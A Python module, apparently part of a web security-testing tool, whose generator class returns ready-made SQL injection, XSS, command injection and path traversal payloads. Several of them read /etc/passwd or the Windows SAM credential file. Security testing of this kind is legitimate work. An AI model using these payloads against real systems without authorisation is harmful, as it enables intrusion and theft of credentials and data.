"""
Web Payload生成器
"""
from typing import Dict, List, Optional
from .payload_generator import PayloadGenerator


class WebPayloadGenerator(PayloadGenerator):
    """Web Payload生成器"""

    def generate(self, payload_type: str, options: Optional[Dict] = None) -> List[str]:
        """生成Web payload"""
        if payload_type == "sql_injection":
            return self._generate_sql_payloads(options)
        elif payload_type == "xss":
            return self._generate_xss_payloads(options)
        elif payload_type == "command_injection":
            return self._generate_command_payloads(options)
        elif payload_type == "path_traversal":
            return self._generate_path_traversal_payloads(options)
        else:
            return []

    def _generate_sql_payloads(self, options: Optional[Dict]) -> List[str]:
        """生成SQL注入payload"""
        payloads = [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT NULL--",
            "' UNION SELECT 1,2,3--",
            "1' AND '1'='1",
            "1' AND '1'='2",
            "' OR 1=1--",
            "' OR 'a'='a",
            "') OR ('1'='1",
        ]

        # 数据库特定payload
        if options and options.get("db_type"):
            db_type = options["db_type"].lower()
            if db_type == "mysql":
                payloads.extend([
                    "' UNION SELECT @@version--",
                    "' UNION SELECT user()--",
                    "' UNION SELECT database()--",
                ])
            elif db_type == "postgresql":
                payloads.extend([
                    "' UNION SELECT version()--",
                    "' UNION SELECT current_user--",
                ])

        return payloads

    def _generate_xss_payloads(self, options: Optional[Dict]) -> List[str]:
        """生成XSS payload"""
        payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<body onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<video><source onerror=alert('XSS')>",
            "<audio src=x onerror=alert('XSS')>",
        ]

        # 编码payload
        if options and options.get("encoded"):
            encoded_payloads = [
                "%3Cscript%3Ealert('XSS')%3C/script%3E",
                "&#60;script&#62;alert('XSS')&#60;/script&#62;",
            ]
            payloads.extend(encoded_payloads)

        return payloads

    def _generate_command_payloads(self, options: Optional[Dict]) -> List[str]:
        """生成命令注入payload"""
        payloads = [
            "; ls",
            "| ls",
            "& ls",
            "`ls`",
            "$(ls)",
            "; cat /etc/passwd",
            "| cat /etc/passwd",
            "& cat /etc/passwd",
            "; whoami",
            "| whoami",
            "& whoami",
        ]

        # Windows特定
        if options and options.get("os") == "windows":
            payloads.extend([
                "; dir",
                "| dir",
                "& dir",
                "; type C:\\Windows\\System32\\config\\sam",
            ])

        return payloads

    def _generate_path_traversal_payloads(self, options: Optional[Dict]) -> List[str]:
        """生成路径遍历payload"""
        payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ]

        return payloads

